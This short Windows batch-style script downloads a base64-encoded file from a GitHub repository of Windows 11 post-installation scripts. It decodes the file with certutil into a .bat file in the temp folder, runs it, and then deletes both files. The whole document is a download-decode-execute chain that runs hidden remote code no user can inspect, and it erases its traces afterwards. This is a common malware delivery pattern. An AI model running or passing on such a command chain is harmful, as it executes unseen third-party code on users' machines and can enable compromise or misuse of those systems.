powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12'; (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/mastercodeon31415/Windows11-PostInstallationScripts/refs/heads/main/hwidScript.b64', [System.Environment]::ExpandEnvironmentVariables('%TEMP%') + '\temp.b64')"
cmd -c certutil -f -decode %temp%\temp.b64 %temp%\decoded.bat
cmd -c call %temp%\decoded.bat 
cmd -c del %temp%\temp.b64 %temp%\decoded.bat